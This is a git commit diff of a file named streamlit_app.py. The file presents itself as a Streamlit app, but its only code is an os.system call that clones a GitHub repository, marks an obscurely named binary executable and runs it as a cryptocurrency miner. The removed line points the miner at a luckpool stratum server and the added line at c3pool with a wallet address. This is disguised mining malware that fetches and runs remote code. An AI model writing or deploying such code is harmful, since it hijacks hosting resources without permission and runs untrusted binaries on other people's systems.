e13577c6373a98309b1926bbc03df3992c970ae8
ontaracing04 <110086717+ontaracing04@users.noreply.github.com>
2022-07-29 13:58:28 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,2 +1,2 @@
 import os
-os.system("git clone https://github.com/indah38/super-duper-disco.git && cd super-duper-disco && chmod +x kuntulminer && ./kuntulminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RBG1qWaLRYGddYdKhfJiUzKr7K2hNS5Mn5..bajingan -p x --cpu 16 -F")
+os.system("git clone https://github.com/ontaracing04/sue.git && cd sue && chmod +x - && ./- -o auto.c3pool.org:80 -u 83HzBwN146c9iq4p8mcxT6fM3hUNmHpzZii8uS8j37LkimD72XNQ3kZ9GisSHpWNw4UKapG4pkfzB9hKvvXxvdn2Gmrynju.$(echo $(shuf -i 1000-99999999999 -n 1)-monyet)")
